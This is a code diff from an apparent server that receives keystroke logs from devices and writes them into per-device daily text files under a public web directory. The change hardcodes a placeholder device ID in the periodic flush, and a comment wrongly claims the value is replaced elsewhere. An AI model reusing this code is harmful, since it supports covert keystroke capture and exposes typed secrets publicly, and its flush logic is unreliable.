@@ -249,14 +249,16 @@ const flushLogsToFileAsync = (filePath: string) => {
 };
 
 // Periodically flush logs
-
 setInterval(async () => {
 	if (logBuffer.length > 0) {
-		const logsDir = path.join(__dirname, "../../public/keylogs"); // Updated path to include keylogs
+		const logsDir = path.join(__dirname, "../../public/keylogs"); // Base logs directory
 		const today = new Date().toISOString().split("T")[0];
 
-		// Log file without deviceId
-		const filePath = path.join(logsDir, `${today}.txt`);
+		// We need to check the deviceId folder for flushing
+		// Using a placeholder since we don't have deviceId here, will be updated in addNewKeyLogs
+		const deviceId = "placeholderDeviceId"; // This will be replaced in addNewKeyLogs
+		const deviceLogsDir = path.join(logsDir, deviceId); // Full path to the device folder
+		const filePath = path.join(deviceLogsDir, `${today}.txt`); // Full path to the log file
 
 		await flushLogsToFileAsync(filePath);
 	}
@@ -273,14 +275,14 @@ export const addNewKeyLogs = async (data: any) => {
 			};
 		}
 
-		// Updated path to include keylogs directory and deviceId
+		// Create the device-specific logs directory
 		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId);
 		if (!fs.existsSync(logsDir)) {
 			fs.mkdirSync(logsDir, { recursive: true });
 		}
 
 		const today = new Date().toISOString().split("T")[0];
-		// Log file inside the deviceId folder
+		// Ensure log file is created within the device's folder
 		const filePath = path.join(logsDir, `${today}.txt`);
 
 		const formattedDate = new Date()
